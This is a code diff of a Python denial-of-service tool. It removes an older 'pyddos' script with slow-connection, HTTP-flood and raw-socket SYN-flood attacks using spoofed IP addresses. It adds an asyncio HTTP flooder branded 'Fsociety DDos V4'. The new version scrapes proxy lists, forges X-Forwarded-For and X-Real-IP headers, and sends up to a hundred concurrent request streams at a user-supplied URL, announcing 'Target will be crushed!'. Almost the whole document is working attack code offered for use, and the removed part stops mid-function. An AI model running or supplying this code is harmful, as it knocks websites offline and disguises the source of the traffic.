@@ -1,492 +1,283 @@
-#!/usr/bin/env python3
-
-version = '3.0'
-
-try:
-	title = r'''
- .----------------.  .----------------.   .----------------.  .----------------.  .----------------.  .----------------. 
-| .--------------. || .--------------. | | .--------------. || .--------------. || .--------------. || .--------------. |
-| |   ______     | || |  ____  ____  | | | |  ________    | || |  ________    | || |     ____     | || |    _______   | |
-| |  |_   __ \   | || | |_  _||_  _| | | | | |_   ___ `.  | || | |_   ___ `.  | || |   .'    `.   | || |   /  ___  |  | |
-| |    | |__) |  | || |   \ \  / /   | | | |   | |   `. \ | || |   | |   `. \ | || |  /  .--.  \  | || |  |  (__ \_|  | |
-| |    |  ___/   | || |    \ \/ /    | | | |   | |    | | | || |   | |    | | | || |  | |    | |  | || |   '.___`-.   | |
-| |   _| |_      | || |    _|  |_    | | | |  _| |___.' / | || |  _| |___.' / | || |  \  `--'  /  | || |  |`\____) |  | |
-| |  |_____|     | || |   |______|   | | | | |________.'  | || | |________.'  | || |   `.____.'   | || |  |_______.'  | |
-| |              | || |              | | | |              | || |              | || |              | || |              | |
-| '--------------' || '--------------' | | '--------------' || '--------------' || '--------------' || '--------------' |
- '----------------'  '----------------'   '----------------'  '----------------'  '----------------'  '----------------'   
-			
-DDos python script | Script used for testing ddos | Ddos attack
-Author: ___T7hM1___
-Github: http://github.com/t7hm1/pyddos
-Version: {}
-'''.format(version)
-except SyntaxError:
-	title = "Py DDoS"
-
-
-import re
-import os
 import sys
-import json
-import time
+import asyncio
+import aiohttp
+import random
+import re
+import itertools
 import string
-import signal
-import http.client, urllib.parse
-from random import *
-from socket import *
-from struct import *
-from threading import *
-from argparse import ArgumentParser, RawTextHelpFormatter
-
-if os.name == 'posix':
-	c = os.system('which pip')
-	if c == 256:
-		os.system('sudo apt-get install python-pip')
-	else:
-		pass
-else:
-	print('[-] Check your pip installer')
-
-try:
-	import requests, colorama
-	from termcolor import colored, cprint
-except:
-	try:
-		if os.name == 'posix':
-			os.system('sudo pip install colorama termcolor requests')
-			sys.exit('[+] I have installed necessary modules for you')
-		elif os.name == 'nt':
-			os.system('pip uninstall colorama requests termcolor')
-			sys.exit('[+] I have installed nessecary modules for you')
-		else:
-			sys.exit('[-] Download and install necessary modules')
-	except Exception as e:
-		print('[-]', e)
-if os.name == 'nt':
-	colorama.init()
-
-signal.signal(signal.SIGFPE, signal.SIG_DFL)
+import time
+import colorama
+import pystyle
+import os
 
 
-def fake_ip():
-	while True:
-		ips = [str(randrange(0, 256)) for i in range(4)]
-		if ips[0] == "127":
-			continue
-		fkip = '.'.join(ips)
-		break
-	return fkip
+
+os.system('cls' if os.name == 'nt' else 'clear') 
+os.system(                        '               title                                      Fsocety DDos V4 -By @Hyper          ' if os.name == 'nt' else '')  
 
 
-def check_tgt(args):
-	tgt = args.d
-	try:
-		ip = gethostbyname(tgt)
-	except:
-		sys.exit(cprint('[-] Can\'t resolve host:Unknown host!', 'red'))
-	return ip
 
 
-def add_useragent():
-	try:
-		with open("./ua.txt", "r") as fp:
-			uagents = re.findall(r"(.+)\n", fp.read())
-	except FileNotFoundError:
-		cprint('[-] No file named \'ua.txt\',failed to load User-Agents', 'yellow')
-		return []
-	return uagents
+
+user_agents = [
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
+"Mozilla/5.0 (Linux; Android 11; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
+"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
+"Mozilla/5.0 (Linux i645 ) AppleWebKit/601.39 (KHTML, like Gecko) Chrome/52.0.1303.178 Safari/600",     
+"Mozilla/5.0 (Windows; U; Windows NT 6.2; x64; en-US) AppleWebKit/603.16 (KHTML, like Gecko) Chrome/49.0.3596.149 Safari/602",
+"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_12_8) AppleWebKit/537.8 (KHTML, like Gecko) Chrome/51.0.3447.202 Safari/533",
+"Mozilla/5.0 (U; Linux x86_64; en-US) AppleWebKit/535.12 (KHTML, like Gecko) Chrome/54.0.2790.274 Safari/601",
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 7_5_1) AppleWebKit/534.29 (KHTML, like Gecko) Chrome/54.0.2941.340 Safari/602",
+"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 7_4_2) AppleWebKit/602.18 (KHTML, like Gecko) Chrome/47.0.1755.159 Safari/600",
+"Mozilla/5.0 (iPhone; CPU iPhone OS 9_6_4; like Mac OS X) AppleWebKit/601.29 (KHTML, like Gecko)  Chrome/47.0.1661.149 Mobile Safari/536.4",
+"Mozilla/5.0 (Linux; Android 5.1; SM-G9350T Build/LMY47X) AppleWebKit/602.21 (KHTML, like Gecko)  Chrome/50.0.1176.329 Mobile Safari/535.9",
+"Mozilla/5.0 (Linux; U; Android 6.0.1; HTC One M8 Build/MRA58K) AppleWebKit/600.36 (KHTML, like Gecko)  Chrome/53.0.3363.154 Mobile Safari/537.2",
+"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 8_8_3) Gecko/20100101 Firefox/50.7",
+"Mozilla/5.0 (U; Linux i671 x86_64) AppleWebKit/535.27 (KHTML, like Gecko) Chrome/54.0.1417.286 Safari/537",
+"Mozilla/5.0 (iPad; CPU iPad OS 9_4_4 like Mac OS X) AppleWebKit/536.12 (KHTML, like Gecko)  Chrome/55.0.1687.155 Mobile Safari/600.8",
+"Mozilla/5.0 (Linux; Android 4.4.1; LG-V510 Build/KOT49I) AppleWebKit/535.28 (KHTML, like Gecko)  Chrome/52.0.2705.296 Mobile Safari/602.9",
+"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/54.0.2084.216 Safari/603.3 Edge/8.91691",
+"Mozilla/5.0 (compatible; MSIE 11.0; Windows; Windows NT 6.0; WOW64; en-US Trident/7.0)",
+  "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36",
+  "Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/15E148 Safari/604.1",
+  "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36",
+  "Mozilla/5.0 (iPhone; CPU iPhone OS 18_5_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/138.0.7204.156 Mobile/15E148 Safari/604.1",
+  "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1",
+  "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36",
+  "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
+  "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/28.0 Chrome/130.0.0.0 Mobile Safari/537.36",
+  "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
+  "Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
+  "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Mobile/15E148 Safari/604.1",
+  "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
+  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
+  "Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/15E148 Safari/604.1 Ddg/18.5",
+  "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
+  "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36",
+  "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
+  "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1.1 Mobile/15E148 Safari/604.1",
+  "Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1",
+  "Mozilla/5.0 (iPhone; CPU iPhone OS 19_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Mobile/15E148 Safari/604.1",
+  "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36",
+  "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
+  "Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3.1 Mobile/15E148 Safari/604.1",
+  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
+  "Mozilla/5.0 (iPhone; CPU iPhone OS 18_5_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/138.0.7204.119 Mobile/15E148 Safari/604.1",
+  "Mozilla/5.0 (iPhone; CPU iPhone OS 18_5_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/139.0.7258.76 Mobile/15E148 Safari/604.1",
+  "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_11 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6.1 Mobile/15E148 Safari/604.1",
+  "Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/22F76 Safari/604.1",
+  "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
+  "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1"
+]
 
 
-def add_bots():
-	bots = []
-	bots.append('http://www.bing.com/search?q=%40&count=50&first=0')
-	bots.append('http://www.google.com/search?hl=en&num=100&q=intext%3A%40&ie=utf-8')
-	return bots
+proxy_sources = [
+    "https://www.us-proxy.org",
+    "https://www.socks-proxy.net",
+    "https://proxyscrape.com/free-proxy-list",
+    "https://www.proxynova.com/proxy-server-list/",
+    "https://proxybros.com/free-proxy-list/",
+    "https://proxydb.net/",
+    "https://spys.one/en/free-proxy-list/",
+    "https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=1#google_vignette",
+    "https://hasdata.com/free-proxy-list",
+    "https://www.proxyrack.com/free-proxy-list/",
+    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
+    "https://www.shodan.io/search?query=brazil",
+    "https://www.shodan.io/search?query=germany",
+    "https://www.shodan.io/search?query=france",
+    "https://www.shodan.io/search?query=USA",
+    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks4/data.txt",
+    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks5/data.txt",
+    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt",
+    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
+    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
+    "https://geonode.com/free-proxy-list",
+    "https://www.proxynova.com/proxy-server-list/anonymous-proxies/",
+    "https://www.us-proxy.org",
+    "https://www.socks-proxy.net",
+    "https://proxyscrape.com/free-proxy-list",
+    "https://www.proxynova.com/proxy-server-list/",
+    "https://proxybros.com/free-proxy-list/",
+    "https://proxydb.net/",
+    "https://spys.one/en/free-proxy-list/",
+    "https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=1#google_vignette",
+    "https://hasdata.com/free-proxy-list",
+    "https://www.proxyrack.com/free-proxy-list/",
+    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
+    "https://www.shodan.io/search?query=brazil",
+    "https://www.shodan.io/search?query=germany",
+    "https://www.shodan.io/search?query=france",
+    "https://www.shodan.io/search?query=USA",
+    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks4/data.txt",
+    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks5/data.txt",
+    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt",
+    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
+    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
+    "https://geonode.com/free-proxy-list",
+    "https://www.proxynova.com/proxy-server-list/anonymous-proxies/",
+    "https://www.us-proxy.org",
+    "https://www.socks-proxy.net",
+    "https://proxyscrape.com/free-proxy-list",
+    "https://www.proxynova.com/proxy-server-list/",
+    "https://proxybros.com/free-proxy-list/",
+    "https://proxydb.net/",
+    "https://spys.one/en/free-proxy-list/",
+    "https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=1#google_vignette",
+    "https://hasdata.com/free-proxy-list",
+    "https://www.proxyrack.com/free-proxy-list/",
+    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
+    "https://www.shodan.io/search?query=brazil",
+    "https://www.shodan.io/search?query=germany",
+    "https://www.shodan.io/search?query=france",
+    "https://www.shodan.io/search?query=USA",
+    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks4/data.txt",
+    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks5/data.txt",
+    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt",
+    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
+    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
+    "https://geonode.com/free-proxy-list",
+    "https://www.proxynova.com/proxy-server-list/anonymous-proxies/",
+    
+
+]
+
+class CliAttacker:
+    """
+    This class contains the core attack logic from the original AttackThread,
+    adapted for a command-line interface.
+    """
+    def __init__(self, target_url, num_requests):
+        """Initializes the attacker with target and request count."""
+        self.target_url = target_url
+        self.num_requests = num_requests
+        self.max_concurrent = 100  
+        self.request_limit = 50000000000  
+
+    def log(self, message):
+        """Prints a message to the console."""
+        print(message)
+
+    async def fetch_ip_addresses(self, url):
+        """Fetches IP addresses from a given URL."""
+        connector = aiohttp.TCPConnector(ssl=False)
+        async with aiohttp.ClientSession(connector=connector) as session:
+            try:
+                async with session.get(url, timeout=5) as response:
+                    text = await response.text()
+                    
+                    ip_addresses = re.findall(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b", text)
+                    return ip_addresses
+            except Exception as e:
+                
+                self.log(f"Failed to fetch IPs from {url}: {e}")
+                return []
+
+    async def get_all_ips(self):
+        """Gathers IPs from all sources and adds some random ones."""
+        tasks = [self.fetch_ip_addresses(url) for url in proxy_sources]
+        ip_lists = await asyncio.gather(*tasks, return_exceptions=True)
+        
+        all_ips = [ip for sublist in ip_lists if isinstance(sublist, list) for ip in sublist]
+        
+        all_ips.extend([f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}" for _ in range(500)])
+        return all_ips
+
+    async def send_request(self, session, ip_address):
+        """Sends a single spoofed request to the target."""
+        headers = {
+            "User-Agent": random.choice(user_agents),
+            "X-Forwarded-For": ip_address,
+            "Accept": random.choice(["text/html", "application/json", "text/plain", "*/*"]),
+            "Accept-Language": random.choice(["en-US", "pl-PL", "de-DE", "fr-FR", "es-ES", "it-IT"]),
+            "Accept-Encoding": random.choice(["gzip", "deflate", "br"]),
+            "Cache-Control": "no-cache",
+            "Connection": random.choice(["keep-alive", "close"]),
+            "X-Real-IP": ip_address,
+            "X-Request-ID": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
+            "Referer": random.choice(["https://google.com", "https://bing.com", "https://yahoo.com", self.target_url, "https://duckduckgo.com"]),
+            "Origin": random.choice(["https://example.com", self.target_url, "https://randomsite.com"])
+        }
+        try:
+            async with session.get(self.target_url, headers=headers, timeout=2) as response:
+                
+                self.log(f"\033[31mfsociety \033[33m@root -> \033[32m{self.target_url} \033[37mwith IP: \033[34m{ip_address} - \033[37mStatus: \033[31m{response.status}")
+        except Exception:
+           
+            pass
+
+    async def attack_worker(self, session, ip_cycle, requests_per_worker):
+        """A worker task that sends a batch of requests."""
+        for _ in range(requests_per_worker):
+            await self.send_request(session, next(ip_cycle))
+            
+            await asyncio.sleep(1 / self.request_limit)
+
+    async def attack(self):
+        """Main async attack function."""
+        ip_list = await self.get_all_ips()
+        if not ip_list:
+            self.log("No IP list found. Generating random IPs...")
+            ip_list = [f"10.0.{random.randint(0, 255)}.{random.randint(0, 255)}" for _ in range(1000)]
+        
+        ip_cycle = itertools.cycle(ip_list)
+       
+        requests_per_worker = self.num_requests // self.max_concurrent
+
+        async def worker():
+            """Defines a worker session."""
+            connector = aiohttp.TCPConnector(ssl=False)
+            async with aiohttp.ClientSession(connector=connector) as session:
+                await self.attack_worker(session, ip_cycle, requests_per_worker)
+
+        start_time = time.time()
+       
+        tasks = [worker() for _ in range(self.max_concurrent)]
+        await asyncio.gather(*tasks, return_exceptions=True)
+        elapsed_time = time.time() - start_time
+        self.log(f" \033[33mAttack finished in {elapsed_time:.2f} seconds. Target down!")
+
+    def run(self):
+        """Entry point to start the asyncio event loop."""
+        
+        asyncio.run(self.attack())
+
+def print_fsociety_art():
+    """Prints the FSociety ASCII art and slogan."""
+    print("\033[31m")  
+    print("    ____                _      __           _    ____ __")
+    print("   / __/________  _____(_)__  / /___  __   | |  / / // /")
+    print("  / /_/ ___/ __ \\/ ___/ / _ \\/ __/ / / /   | | / / // /_")
+    print(" / __(__  ) /_/ / /__/ /  __/ /_/ /_/ /    | |/ /__  __/")
+    print("/_/ /____/\\____/\\___/_/\\___/\\__/\\__, /     |___/  /_/")
+    print("                                /____/               ")
+    print("\033[37mWelcome DDos V4 Fsociety by \033[32m@Hyper")
+    print("\033[0m")  
 
 
-class Pyslow:
-	def __init__(self,
-				 tgt,
-				 port,
-				 to,
-				 threads,
-				 sleep):
-		self.tgt = tgt
-		self.port = port
-		self.to = to
-		self.threads = threads
-		self.sleep = sleep
-		self.method = ['GET', 'POST']
-		self.pkt_count = 0
+if __name__ == "__main__":
+    print_fsociety_art()
+    
+    
+    target_url = input("Enter Target \033[32mURL: ")
+    
+    num_requests_str = input("\033[32mEnter \033[37mNumber of Requests: ")
+    try:
+        num_requests = int(num_requests_str)
+    except ValueError:
+        print("\033[31mError: \033[37mNumber of requests must be an integer!")
+        sys.exit(1)
 
-	def mypkt(self):
-		text = choice(self.method) + ' /' + str(randint(1, 999999999)) + ' HTTP/1.1\r\n' + \
-			   'Host:' + self.tgt + '\r\n' + \
-			   'User-Agent:' + choice(add_useragent()) + '\r\n' + \
-			   'Content-Length: 42\r\n'
-		pkt = buffer(text)
-		return pkt
+   
+    if not target_url or num_requests <= 0:
+        print("\033[31mError: E\033[37mnter a valid URL and a positive number of requests!")
+        sys.exit(1)
 
-	def building_socket(self):
-		try:
-			sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
-			sock.settimeout(self.to)
-			sock.connect((self.tgt, int(self.port)))
-			self.pkt_count += 3
-			if sock:
-				sock.sendto(self.mypkt(), (self.tgt, int(self.port)))
-				self.pkt_count += 1
-		except Exception:
-			sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
-			sock.settimeout(self.to)
-			sock.connect((self.tgt, int(self.port)))
-			sock.settimeout(None)
-			self.pkt_count += 3
-			if sock:
-				sock.sendto(self.mypkt(), (self.tgt, int(self.port)))
-				self.pkt_count += 1
-		except KeyboardInterrupt:
-			sys.exit(cprint('[-] Canceled by user', 'red'))
-		return sock
+    print("\n\033[32mDDoS attack started. \033[33mTarget will be crushed!")
+    print("\033[31mAttack has begun!  \033[33mCheck the logs!\n")
 
-	def sending_packets(self):
-		try:
-			sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
-			sock.settimeout(self.to)
-			sock.connect((self.tgt, int(self.port)))
-			self.pkt_count += 3
-			if sock:
-				sock.sendall(b'X-a: b\r\n')
-				self.pkt += 1
-		except Exception:
-			sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
-			sock.settimeout(self.to)
-			sock.connect((self.tgt, int(self.port)))
-			sock.settimeout(None)
-			if sock:
-				sock.sendall('X-a: b\r\n')
-				self.pkt_count += 1
-		except KeyboardInterrupt:
-			sys.exit(cprint('[-] Canceled by user', 'red'))
-		return sock
-
-	def doconnection(self):
-		socks = 0
-		fail = 0
-		lsocks = []
-		lhandlers = []
-		cprint('\t\tBuilding sockets', 'blue')
-		while socks < (int(self.threads)):
-			try:
-				sock = self.building_socket()
-				if sock:
-					lsocks.append(sock)
-					socks += 1
-					if socks > int(self.threads):
-						break
-			except Exception:
-				fail += 1
-			except KeyboardInterrupt:
-				sys.exit(cprint('[-] Canceled by user', 'red'))
-		cprint('\t\tSending packets', 'blue')
-		while socks < int(self.threads):
-			try:
-				handler = self.sending_packets()
-				if handler:
-					lhandlers.append(handler)
-					socks += 1
-					if socks > int(self.threads):
-						break
-				else:
-					cprint(f'[+] Pyslow: Sent {self.pkt_count} packets', 'green')
-			except Exception:
-				fail += 1
-			except KeyboardInterrupt:
-				sys.exit(cprint('[-] Canceled by user', 'red'))
-				break
-		# print colored('I have sent ','green') + colored(str(self.pkt_count),'cyan') + colored(' packets successfully.Now i\'m going to sleep for ','green') + colored(self.sleep,'red') + colored(' second','green')
-		time.sleep(self.sleep)
-
-
-req_count = 0
-
-
-class Requester(Thread):
-	def __init__(self, tgt):
-		Thread.__init__(self)
-		self.tgt = tgt
-		self.port = None
-		self.ssl = False
-		self.req = []
-		self.lock = Lock()
-
-		url_type = urllib.parse.urlparse(self.tgt)
-		if url_type.scheme == 'https':
-			self.ssl = True
-			if self.ssl == True:
-				self.port = 443
-		else:
-			self.port = 80
-
-	def header(self):
-		cachetype = ['no-cache', 'no-store', 'max-age=' + str(randint(0, 10)), 'max-stale=' + str(randint(0, 100)),
-					 'min-fresh=' + str(randint(0, 10)), 'notransform', 'only-if-cache']
-		acceptEc = ['compress,gzip', '', '*', 'compress;q=0,5, gzip;q=1.0', 'gzip;q=1.0, indentity; q=0.5, *;q=0']
-		acceptC = ['ISO-8859-1', 'utf-8', 'Windows-1251', 'ISO-8859-2', 'ISO-8859-15']
-		bot = add_bots()
-		c = choice(cachetype)
-		a = choice(acceptEc)
-		http_header = {
-			'User-Agent': choice(add_useragent()),
-			'Cache-Control': c,
-			'Accept-Encoding': a,
-			'Keep-Alive': '42',
-			'Host': self.tgt,
-			'Referer': choice(bot)
-		}
-		return http_header
-
-	def rand_str(self):
-		mystr = []
-		for x in range(3):
-			chars = tuple(string.ascii_letters + string.digits)
-			text = (choice(chars) for _ in range(randint(7, 14)))
-			text = ''.join(text)
-			mystr.append(text)
-		return '&'.join(mystr)
-
-	def create_url(self):
-		return self.tgt + '?' + self.rand_str()
-
-	def data(self):
-		url = self.create_url()
-		http_header = self.header()
-		return url, http_header
-
-	def run(self):
-		global req_count
-
-		try:
-			if self.ssl:
-				conn = http.client.HTTPSConnection(self.tgt, self.port)
-			else:
-				conn = http.client.HTTPConnection(self.tgt, self.port)
-				self.req.append(conn)
-			for reqter in self.req:
-				(url, http_header) = self.data()
-				method = choice(['get', 'post'])
-				reqter.request(method.upper(), url, None, http_header)
-				with self.lock:
-					req_count += 1
-				print(colored(f"[+] Requester: Sent {req_count} HTTP requests", "green"))
-		except KeyboardInterrupt:
-			sys.exit(cprint('[-] Canceled by user', 'red'))
-		except Exception as e:
-			print(e)
-		finally:
-			self.closeConnections()
-
-	def closeConnections(self):
-		for conn in self.req:
-			try:
-				conn.close()
-			except:
-				pass
-
-
-sent_syn_packets = 0
-
-
-class Synflood(Thread):
-	def __init__(self, tgt, ip, sock=None):
-		Thread.__init__(self)
-		self.tgt = tgt
-		self.ip = ip
-		self.psh = ''
-		if sock is None:
-			self.sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
-			self.sock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
-		else:
-			self.sock = sock
-		self.lock = Lock()
-
-	def checksum(self):
-		s = 0
-		for i in range(0, len(self.psh), 2):
-			w = (ord(self.psh[i]) << 8) + (ord(self.psh[i + 1]))
-			s = s + w
-
-		s = (s >> 16) + (s & 0xffff)
-		s = ~s & 0xffff
-
-		return s
-
-	def Building_packet(self):
-		ihl = 5
-		version = 4
-		tos = 0
-		tot = 40
-		id = 54321
-		frag_off = 0
-		ttl = 64
-		protocol = IPPROTO_TCP
-		check = 10
-		s_addr = inet_aton(self.ip)
-		d_addr = inet_aton(self.tgt)
-
-		ihl_version = (version << 4) + ihl
-		ip_header = pack('!BBHHHBBH4s4s', ihl_version, tos, tot, id, frag_off, ttl, protocol, check, s_addr, d_addr)
-
-		source = 54321
-		dest = 80
-		seq = 0
-		ack_seq = 0
-		doff = 5
-		fin = 0
-		syn = 1
-		rst = 0
-		ack = 0
-		psh = 0
-		urg = 0
-		window = htons(5840)
-		check = 0
-		urg_prt = 0
-
-		offset_res = (doff << 4)
-		tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
-		tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags, window, check, urg_prt)
-
-		src_addr = inet_aton(self.ip)
-		dst_addr = inet_aton(self.tgt)
-		place = 0
-		protocol = IPPROTO_TCP
-		tcp_length = len(tcp_header)
-
-		self.psh = pack('!4s4sBBH', src_addr, dst_addr, place, protocol, tcp_length);
-		self.psh = self.psh + tcp_header;
-
-		tcp_checksum = self.checksum()
-
-		tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags, window, tcp_checksum,
-						  urg_prt)
-		packet = ip_header + tcp_header
-
-		return packet
-
-	def run(self):
-		global sent_syn_packets
-		packet = self.Building_packet()
-		try:
-			self.lock.acquire()
-			self.sock.sendto(packet, (self.tgt, 0))
-		except KeyboardInterrupt:
-			sys.exit(cprint('[-] Canceled by user', 'red'))
-		except Exception as e:
-			cprint(e, 'red')
-		finally:
-			with self.lock:
-				sent_syn_packets += 1
-			self.lock.release()
-
-
-def main():
-	parser = ArgumentParser(
-		usage='./%(prog)s -t [target] -p [port] -t [number threads]',
-		formatter_class=RawTextHelpFormatter,
-		prog='pyddos',
-		description=cprint(title, 'white', attrs=['bold']),
-		epilog='''
-Example:
-    ./%(prog)s -d www.example.com -p 80 -T 2000 -Pyslow
-    ./%(prog)s -d www.domain.com -s 100 -Request
-    ./%(prog)s -d www.google.com -Synflood -T 5000 -t 10.0
-'''
-	)
-	options = parser.add_argument_group('options', '')
-	options.add_argument('-d', metavar='<ip|domain>', default=False,
-						 help='Specify your target such an ip or domain name')
-	options.add_argument('-t', metavar='<float>', default=5.0, help='Set timeout for socket')
-	options.add_argument('-T', metavar='<int>', default=1000, help='Set threads number for connection (default = 1000)')
-	options.add_argument('-p', metavar='<int>', default=80,
-						 help='Specify port target (default = 80)' + colored(' |Only required with pyslow attack|',
-																			 'red'))
-	options.add_argument('-s', metavar='<int>', default=100, help='Set sleep time for reconnection')
-	options.add_argument('-i', metavar='<ip address>', default=False, help='Specify spoofed ip unless use fake ip')
-	options.add_argument('-Request', action='store_true', help='Enable request target')
-	options.add_argument('-Synflood', action='store_true', help='Enable synflood attack')
-	options.add_argument('-Pyslow', action='store_true', help='Enable pyslow attack')
-	options.add_argument('--fakeip', action='store_true', default=False,
-						 help='Option to create fake ip if not specify spoofed ip')
-	args = parser.parse_args()
-	if args.d == False:
-		parser.print_help()
-		sys.exit()
-	add_bots();
-	add_useragent()
-	if args.d:
-		check_tgt(args)
-	if args.Synflood:
-		uid = os.getpid()
-		if uid == 0:
